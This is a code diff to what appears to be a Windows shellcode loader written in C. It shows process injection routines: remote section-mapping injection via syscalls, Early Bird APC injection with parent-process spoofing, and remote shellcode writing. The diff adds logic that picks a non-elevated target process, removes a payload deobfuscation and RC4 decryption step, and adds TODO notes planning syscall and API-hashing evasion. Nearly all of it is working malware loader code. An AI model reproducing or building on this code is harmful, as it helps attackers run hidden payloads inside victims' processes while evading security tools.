@@ -43,6 +43,26 @@ BOOL LoadPayloadFromResource(OUT PVOID* ppPayloadAddress, OUT SIZE_T* pPayloadSi
 	return TRUE;
 }
 
+// TODO: use syscalls or API hashing
+// TODO: understand the code
+BOOL IsProcessElevated(HANDLE hProcess) {
+	HANDLE			hToken = NULL;
+	TOKEN_ELEVATION elevation = { 0 };
+	DWORD			dwSize = 0;
+
+	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
+		return FALSE;  // Assume not elevated if we can't open the token
+	}
+
+	if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize)) {
+		CloseHandle(hToken);
+		return FALSE;
+	}
+
+	CloseHandle(hToken);
+	return elevation.TokenIsElevated;
+}
+
 BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDLE* phProcess)
 {
 	ULONG							uReturnLen1 = 0;
@@ -79,12 +99,26 @@ BOOL GetRemoteProcessHandle(IN LPCWSTR pwstrProcName, IN DWORD* pdwPid, IN HANDL
 	SystemProcInfo = (PSYSTEM_PROCESS_INFORMATION)((ULONG_PTR)SystemProcInfo + SystemProcInfo->NextEntryOffset);
 
 	while (TRUE) {
+		PRINTW(L"[i] Checking Process Name: %ws\n", SystemProcInfo->ImageName.Buffer);
+
 		// Small check for the process's name size
 		// Comparing the enumerated process name to what we want to target
 		if (SystemProcInfo->ImageName.Length && IsStringEqual(pwstrProcName, SystemProcInfo->ImageName.Buffer) == TRUE) {
 			*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
-			*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
-			break;
+			/// ERROR: If the process has higher privileges than the current process, OpenProcess will fail and phProcess will be NULL
+			//*phProcess = g_Api.pOpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
+			//break;
+
+			/// INFO: PROCESS_QUERY_LIMITED_INFORMATION allows querying limited details about the process without requiring full access rights.
+			HANDLE hProcess = g_Api.pOpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, (DWORD)SystemProcInfo->UniqueProcessId);
+			if (hProcess) {
+				if (!IsProcessElevated(hProcess)) {  // Check if process is non-elevated
+					*pdwPid = (DWORD)SystemProcInfo->UniqueProcessId;
+					*phProcess = hProcess;
+					break;
+				}
+				CloseHandle(hProcess); // Close handle if elevated
+			}
 		}
 
 		// If NextEntryOffset is 0, we reached the end of the array
@@ -143,7 +177,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		PRINTA("[!] NtMapViewOfSection [R] Failed With Error : 0x%0.8X \n", status);
 		return FALSE;
 	}
-
 	PRINTA("[+] Local Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedAddress, (INT)sViewSize);
 
 	// Writing the payload
@@ -171,30 +204,6 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 		}
 		PRINTA("[+] Remote Memory Allocated At : 0x%p Of Size : %d \n", pAllocatedRemoteAddress, (INT)sViewSize);
 	}
-
-	// Deobfuscating the payload
-	PRINTA("[#] Press <Enter> To Deobfuscate The Payload ... ");
-	GETCHAR();
-	SIZE_T	DeobfuscatedPayloadSize = NULL;
-	PBYTE	DeobfuscatedPayloadBuffer = NULL;
-
-	PRINTA("[i] Deobfuscating\" ... ");
-	if (!Deobfuscate(pAllocatedAddress, sPayloadSize, &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize)) {
-		return -1;
-	}
-	PRINTA("[+] DONE \n");
-	PRINTA("\t>>> Deobfuscated Payload Size : %ld \n\t>>> Deobfuscated Payload Located At : 0x%p \n", DeobfuscatedPayloadSize, DeobfuscatedPayloadBuffer);
-
-	// Copying the deobfuscated payload to the allocated address
-	PRINTA("[#] Press <Enter> To Copy The Deobfuscated Payload ... ");
-	GETCHAR();
-	CopyMemoryEx(pAllocatedAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);
-
-	// Decrypting the payload
-	PRINTA("[#] Press <Enter> To Decrypt The Payload ... ");
-	GETCHAR();
-
-	Rc4DecryptionViSystemFunc032(ProtectedKey, pAllocatedAddress, KEY_SIZE, sPayloadSize);
 
 	// Executing the payload via thread creation
 	pExecAddress = pAllocatedAddress;
@@ -260,6 +269,7 @@ BOOL RemoteMappingInjectionViaSyscalls(IN HANDLE hProcess, IN PVOID pPayload, IN
 }
 
 // Function used for APC Injection with PPID Spoofing
+// TODO: use syscalls or API hashings
 BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lpProcessName, OUT DWORD* dwProcessId, OUT HANDLE* hProcess, OUT HANDLE* hThread)
 {
 	CHAR                               lpPath[MAX_PATH * 2];
@@ -352,6 +362,7 @@ BOOL CreatePPidSpoofedAndSuspendedProcess(IN HANDLE hParentProcess, IN LPCSTR lp
 	return FALSE;
 }
 
+// TODO: use syscalls or API hashing
 BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sSizeOfShellcode, OUT PVOID* ppInjectedShellcodeAddress)
 {
 
@@ -392,7 +403,8 @@ BOOL InjectShellcodeToRemoteProcess(HANDLE hProcess, PBYTE pShellcode, SIZE_T sS
 	return TRUE;
 }
 
-BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode) 
+// TODO: use syscalls or API hashing
+BOOL RemoteEarlyBirdApcInjectionViaSyscalls(HANDLE hParentProcess, LPCSTR pstrSacrificalProcessName, PVOID pShellcodeAddress, SIZE_T sSizeOfShellcode)
 {
 
 	HANDLE hProcess = NULL, hThread = NULL;
